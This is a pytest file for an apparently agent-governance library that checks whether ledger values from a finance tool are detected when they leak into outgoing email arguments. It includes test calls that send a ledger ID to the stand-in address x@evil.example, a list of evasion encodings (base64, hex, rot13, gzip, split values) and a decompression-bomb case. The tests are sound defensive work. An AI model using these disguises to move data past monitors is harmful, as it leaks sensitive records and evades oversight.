"""Value-level tracking: what is found, what isn't, and how policies react."""
import base64
from pathlib import Path

import pytest

from aig import Engine, PolicyError, Session, load_policy, parse_policy
from aig.values import ValueIndex, extract

LEDGER = ('[{"id": "TX-1042", "vendor": "Contoso Cloud", "amount": 72300.0, "status": "pending"},'
          ' {"id": "TX-1043", "vendor": "Fabrikam Catering", "amount": 1280.5, "status": "flagged"}]')


@pytest.fixture
def idx():
    i = ValueIndex()
    i.add(LEDGER, {"finance": "finance.query_ledger"})
    return i


def test_atoms_come_from_values_not_keys():
    a = extract(LEDGER)
    assert {"tx1042", "72300", "1280.5"} <= a.strong
    assert {"contoso", "fabrikam", "catering", "flagged"} <= a.words
    assert "vendor" not in a.words and "amount" not in a.words and "status" not in a.words


@pytest.mark.parametrize("body", [
    "TX-1042",                                            # identifier
    "owed 72,300.00",                                     # reformatted amount
    "t x - 1 0 4 2",                                      # spacing games
    "Tx_1042!!",                                          # punctuation and case
    base64.b64encode(LEDGER.encode()).decode(),           # base64
    LEDGER.encode().hex(),                                # hex
    "%54%58%2D%31%30%34%32",                              # URL-encoded
    "contoso and fabrikam",                               # two distinctive words
    '{"x": "{\\"id\\": \\"TX-1043\\"}"}',                 # nested JSON
])
def test_disguised_values_found(idx, body):
    found = idx.find({"body": body})
    assert "finance" in found and "body" in found["finance"].args


@pytest.mark.parametrize("body", [
    "Scheduled for payment.",
    "Thanks Fabrikam, invoice 8812 is in this week's run.",   # one word only: below threshold
    "Status is pending, amount attached.",                     # field names and common words
    "The cloud provider is owed about seventy-two thousand.",  # paraphrase: the documented gap
    "",
])
def test_unrelated_or_paraphrased_text_not_found(idx, body):
    assert idx.find({"body": body}) == {}


def test_evidence_names_argument_values_and_origin(idx):
    ev = idx.find({"to": "x@evil.example", "subject": "hi", "body": "TX-1042"})["finance"]
    text = ev.describe()
    assert "body" in text and "'tx1042'" in text and "finance.query_ledger" in text and "subject" not in text


@pytest.mark.parametrize("body", [
    "TX-\u0661\u0660\u0664\u0662",                      # Arabic-Indic digits
    LEDGER[::-1],                                          # reversed
    __import__("codecs").encode("contoso and fabrikam", "rot13"),
    base64.b32encode(LEDGER.encode()).decode(),            # base32
    base64.b64encode(__import__("gzip").compress(LEDGER.encode())).decode(),   # gzip + base64
])
def test_adversarial_encodings_found(idx, body):
    assert "finance" in idx.find({"body": body})


def test_value_split_across_arguments_found(idx):
    found = idx.find({"subject": "TX-10", "body": "42 owed"})
    assert {"subject", "body"} <= found["finance"].args


def test_value_split_across_calls_found_on_completing_piece(idx):
    assert idx.find({"body": "Contoso 72"}) == {}
    found = idx.find({"body": "300 later"}, history={"body": "contoso72"})
    assert "earlier calls" in found["finance"].args and "72300" in found["finance"].strong
    # a value entirely in earlier calls is not blamed on this call
    assert idx.find({"body": "hello"}, history={"body": "tx1042"}) == {}


def test_email_address_parts_are_not_words():
    i = ValueIndex()
    i.add('{"from": "ap@fabrikam.example", "body": "catering invoice"}', {"x": "t"})
    assert "example" not in i.words and "fabrikam" not in i.words and "catering" in i.words


def test_decompression_is_bounded():
    from aig.values import MAX_UNPACK, _unpack
    bomb = __import__("gzip").compress(b"0" * (MAX_UNPACK * 8))
    assert len(_unpack(bomb)) <= MAX_UNPACK


def test_overflow_fails_closed():
    i = ValueIndex(max_atoms=3)
    i.add(LEDGER, {"finance": "finance.query_ledger"})
    found = i.find({"body": "hello"})
    assert found["finance"].overflow and "full" in found["finance"].describe()


POLICY = load_policy(Path(__file__).parent.parent / "examples" / "enterprise.yaml")


def _session_after_ledger(engine):
    s = Session("expense-bot", "group:finance")
    engine.record(s, "finance.query_ledger")
    engine.observe(s, "finance.query_ledger", {}, LEDGER)
    return s


def test_residual_allow_when_no_values_sent():
    eng = Engine(POLICY)
    d = eng.evaluate(_session_after_ledger(eng), "email.send", {"to": "x@evil.example", "body": "hello"})
    assert d.allowed


def test_residual_require_approval_variant():
    doc = {"version": 1, "tools": {"q": {"reads": ["finance"]}, "send": {"sink": "external"}},
           "agents": [{"id": "a", "purpose": "p", "on_behalf_of": "*", "allow": ["q", "send"]}],
           "flows": [{"from": "finance", "to": "external", "action": "deny", "precision": "value"}]}
    eng = Engine(parse_policy(doc))
    s = Session("a", "u")
    eng.record(s, "q")
    eng.observe(s, "q", {}, LEDGER)
    clean = eng.evaluate(s, "send", {"body": "hello"})
    assert clean.action == "require_approval" and clean.rules[0].endswith(":residual")
    assert eng.evaluate(s, "send", {"body": "TX-1042"}).action == "deny"


def test_session_precision_rules_unchanged():
    eng = Engine(POLICY)
    s = Session("expense-bot", "group:finance")
    eng.record(s, "email.read_inbox")
    d = eng.evaluate(s, "finance.approve_payment", {"id": "nothing-from-the-email"})
    assert d.action == "deny" and "flow:untrusted-no-high-risk" in d.rules


@pytest.mark.parametrize("flow,msg", [
    ({"from": "a", "to": "b", "action": "deny", "precision": "exact"}, "precision"),
    ({"from": "a", "to": "b", "action": "deny", "residual": "allow"}, "only applies"),
    ({"from": "a", "to": "b", "action": "require_approval", "precision": "value", "residual": "deny"}, "stricter"),
])
def test_bad_value_rules_rejected(flow, msg):
    with pytest.raises(PolicyError, match=msg):
        parse_policy({"version": 1, "flows": [flow]})
